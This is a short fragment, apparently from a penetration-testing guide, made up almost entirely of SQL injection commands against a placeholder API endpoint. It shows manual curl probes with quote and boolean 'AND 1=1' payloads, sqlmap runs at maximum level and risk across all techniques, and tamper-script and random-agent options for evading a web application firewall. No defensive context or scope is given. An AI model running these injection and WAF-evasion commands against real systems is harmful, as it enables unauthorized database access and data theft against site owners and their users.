...
```bash
# Manual test first
curl -s "https://TARGET/api/users" | md5sum
curl -s "https://TARGET/api/users'" | md5sum
curl -s "https://TARGET/api/users AND 1=1" | md5sum
curl -s "https://TARGET/api/users AND 1=2" | md5sum

# Try different sqlmap options
sqlmap -u "https://TARGET/api/users" --batch --level=5 --risk=3
sqlmap -u "https://TARGET/api/users" --batch --technique=BEUSTQ
sqlmap -u "https://TARGET/api/users" --batch --tamper=space2comment,between
```

If WAF is blocking:

```bash
sqlmap -u "https://TARGET/api/users" --batch --random-agent --tamper=space2comment
```
...
```bash
sqlmap -u "https://TARGET/api/users?id=1" --batch --random-agent --tamper=space2comment
